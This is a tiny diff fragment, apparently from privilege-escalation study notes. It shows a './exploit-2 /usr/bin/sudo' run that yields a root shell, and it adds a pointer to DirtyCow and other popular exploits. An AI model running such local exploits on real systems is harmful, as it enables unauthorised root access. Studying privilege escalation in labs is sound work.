@@ -73,3 +73,5 @@ cyberslut@nix02:~$ ./exploit-2 /usr/bin/sudo
 
 uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),1000(cyberslut)
 ```
+
+! Check out also for DirtyCow and other popular exploits
